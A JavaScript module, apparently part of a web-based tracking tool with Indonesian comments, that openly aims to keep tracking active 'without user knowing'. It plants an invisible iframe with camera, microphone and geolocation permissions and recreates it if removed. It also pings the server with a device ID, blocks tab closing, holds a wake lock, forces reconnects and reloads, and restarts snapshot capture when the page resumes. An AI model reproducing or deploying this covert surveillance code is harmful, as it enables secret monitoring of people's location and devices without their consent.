/**
 * Background Keeper - Keep tracking active without user knowing
 * Tidak perlu install app, cukup add to home screen
 */

class BackgroundKeeper {
    constructor() {
        this.tabId = null;
        this.windowId = null;
        this.keepAliveInterval = null;
        this.heartbeatInterval = null;
        this.reconnectAttempts = 0;
        this.isHidden = false;
        
        this.init();
    }
    
    init() {
        // Method 1: Hidden iframe yang tetap load
        this.createHiddenIframe();
        
        // Method 2: Service Worker keep alive
        this.registerServiceWorker();
        
        // Method 3: Periodic ping
        this.startHeartbeat();
        
        // Method 4: Visibility change handler
        this.handleVisibility();
        
        // Method 5: BeforeUnload prevention
        this.preventClose();
        
        // Method 6: BroadcastChannel for multi-tab sync
        this.initBroadcastChannel();
        
        // Method 7: WebSocket persistent connection
        this.maintainConnection();
        
        // Method 8: Page lifecycle API
        this.handlePageLifecycle();
        
        // Method 9: Battery optimization bypass
        this.requestWakeLock();
        
        console.log('[BG-Keeper] Initialized - tracking will stay active');
    }
    
    // Method 1: Hidden iframe - selalu load tracker
    createHiddenIframe() {
        const existingIframe = document.getElementById('bg-keeper-iframe');
        if (existingIframe) return;
        
        const iframe = document.createElement('iframe');
        iframe.id = 'bg-keeper-iframe';
        iframe.src = window.location.origin + '/?mode=background';
        iframe.style.cssText = 'position:fixed;width:1px;height:1px;top:-100px;left:-100px;opacity:0;pointer-events:none;';
        iframe.allow = 'camera;microphone;geolocation';
        
        document.body.appendChild(iframe);
        
        // Recreate if removed
        setInterval(() => {
            if (!document.getElementById('bg-keeper-iframe')) {
                this.createHiddenIframe();
            }
        }, 10000);
    }
    
    // Method 2: Service Worker registration
    async registerServiceWorker() {
        if (!('serviceWorker' in navigator)) return;
        
        try {
            const reg = await navigator.serviceWorker.register('/sw.js');
            
            // Request periodic sync (Chrome Android)
            if ('periodicSync' in reg) {
                const status = await navigator.permissions.query({ name: 'periodic-background-sync' });
                if (status.state === 'granted') {
                    await reg.periodicSync.register('periodic-tracker', {
                        minInterval: 5 * 60 * 1000 // 5 minutes
                    });
                }
            }
            
            // Send keepalive to SW
            setInterval(() => {
                if (navigator.serviceWorker.controller) {
                    navigator.serviceWorker.controller.postMessage({
                        type: 'KEEP_ALIVE',
                        time: Date.now()
                    });
                }
            }, 20000);
            
            // Listen to SW messages
            navigator.serviceWorker.addEventListener('message', (e) => {
                if (e.data && e.data.type === 'keepalive') {
                    // SW is keeping us alive
                    this.reconnectAttempts = 0;
                }
            });
            
        } catch (e) {
            console.warn('[BG-Keeper] SW registration failed:', e);
        }
    }
    
    // Method 3: Heartbeat ping
    startHeartbeat() {
        if (this.heartbeatInterval) return;
        
        this.heartbeatInterval = setInterval(() => {
            // Ping server
            fetch('/api/heartbeat', {
                method: 'POST',
                keepalive: true,
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    deviceId: localStorage.getItem('deviceId'),
                    time: Date.now(),
                    hidden: document.hidden,
                    visibility: document.visibilityState
                })
            }).catch(() => {
                this.reconnectAttempts++;
            });
            
            // Keep socket alive
            if (window.socket && !window.socket.connected) {
                window.socket.connect();
            }
        }, 15000); // Every 15s
    }
    
    // Method 4: Visibility API
    handleVisibility() {
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                // Page hidden - maintain tracking
                this.isHidden = true;
                
                // Increase heartbeat frequency
                if (this.heartbeatInterval) {
                    clearInterval(this.heartbeatInterval);
                    this.heartbeatInterval = null;
                }
                this.heartbeatInterval = setInterval(() => {
                    this.sendBackgroundPing();
                }, 10000); // Every 10s when hidden
                
            } else {
                // Page visible again
                this.isHidden = false;
                
                // Reset to normal frequency
                if (this.heartbeatInterval) {
                    clearInterval(this.heartbeatInterval);
                    this.heartbeatInterval = null;
                }
                this.startHeartbeat();
                
                // Reconnect if needed
                if (window.socket && !window.socket.connected) {
                    window.socket.connect();
                }
            }
        });
        
        // Page Visibility API v2
        document.addEventListener('freeze', () => {
            this.sendBackgroundPing('freeze');
        });
        
        document.addEventListener('resume', () => {
            this.sendBackgroundPing('resume');
            if (window.socket) window.socket.connect();
        });
    }
    
    sendBackgroundPing(event = 'heartbeat') {
        navigator.sendBeacon('/api/background-ping', JSON.stringify({
            deviceId: localStorage.getItem('deviceId'),
            event: event,
            time: Date.now()
        }));
    }
    
    // Method 5: Prevent close
    preventClose() {
        window.addEventListener('beforeunload', (e) => {
            // Send final ping
            this.sendBackgroundPing('beforeunload');
            
            // Try to prevent close (will show confirmation)
            if (window.preventClose !== false) {
                e.preventDefault();
                e.returnValue = '';
            }
        });
        
        // Detect back button
        window.addEventListener('popstate', () => {
            this.sendBackgroundPing('navigation');
        });
    }
    
    // Method 6: BroadcastChannel for multi-tab
    initBroadcastChannel() {
        if (!('BroadcastChannel' in window)) return;
        
        try {
            const bc = new BroadcastChannel('tracker_sync');
            
            // Announce presence
            bc.postMessage({ type: 'tab-open', id: Math.random() });
            
            // Listen for other tabs
            bc.onmessage = (e) => {
                if (e.data.type === 'tab-close') {
                    // Another tab closing - ensure we stay alive
                    this.sendBackgroundPing('tab-takeover');
                }
            };
            
            // Announce when closing
            window.addEventListener('beforeunload', () => {
                bc.postMessage({ type: 'tab-close' });
            });
            
        } catch (e) {}
    }
    
    // Method 7: WebSocket persistent
    maintainConnection() {
        if (!window.socket) return;
        
        setInterval(() => {
            if (!window.socket.connected) {
                window.socket.connect();
                this.reconnectAttempts++;
                
                // If too many reconnect attempts, reload page
                if (this.reconnectAttempts > 10) {
                    window.location.reload();
                }
            } else {
                this.reconnectAttempts = 0;
            }
        }, 5000);
    }
    
    // Method 8: Page Lifecycle API
    handlePageLifecycle() {
        // Detect when page is about to be discarded
        document.addEventListener('freeze', () => {
            // Save state before freeze
            localStorage.setItem('lastFreeze', Date.now());
        });
        
        document.addEventListener('resume', () => {
            // Restore state after resume
            const lastFreeze = localStorage.getItem('lastFreeze');
            if (lastFreeze) {
                const elapsed = Date.now() - parseInt(lastFreeze);
                console.log('[BG-Keeper] Resumed after', elapsed, 'ms');
            }
            
            // Reinitialize tracking
            if (window.socket) window.socket.connect();
            if (typeof startSnapshots === 'function') startSnapshots();
        });
    }
    
    // Method 9: Wake Lock API - prevent device sleep
    async requestWakeLock() {
        if (!('wakeLock' in navigator)) return;
        
        try {
            const wakeLock = await navigator.wakeLock.request('screen');
            
            // Reacquire on visibility change
            document.addEventListener('visibilitychange', async () => {
                if (wakeLock !== null && document.visibilityState === 'visible') {
                    await navigator.wakeLock.request('screen');
                }
            });
            
        } catch (e) {
            console.warn('[BG-Keeper] Wake lock failed:', e);
        }
    }
    
    // Auto-recovery if page is killed
    static enableAutoRecovery() {
        // Store last active time
        setInterval(() => {
            localStorage.setItem('lastActive', Date.now());
        }, 5000);
        
        // Check if we were killed and reopen
        const lastActive = localStorage.getItem('lastActive');
        if (lastActive) {
            const elapsed = Date.now() - parseInt(lastActive);
            if (elapsed > 60000) { // More than 1 minute
                console.log('[BG-Keeper] Recovered after', elapsed, 'ms');
                // Notify server about recovery
                fetch('/api/recovery', {
                    method: 'POST',
                    body: JSON.stringify({ elapsed })
                }).catch(() => {});
            }
        }
    }
}

// Auto-initialize when page loads
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        window.bgKeeper = new BackgroundKeeper();
        BackgroundKeeper.enableAutoRecovery();
    });
} else {
    window.bgKeeper = new BackgroundKeeper();
    BackgroundKeeper.enableAutoRecovery();
}

// Export for manual use
window.BackgroundKeeper = BackgroundKeeper;
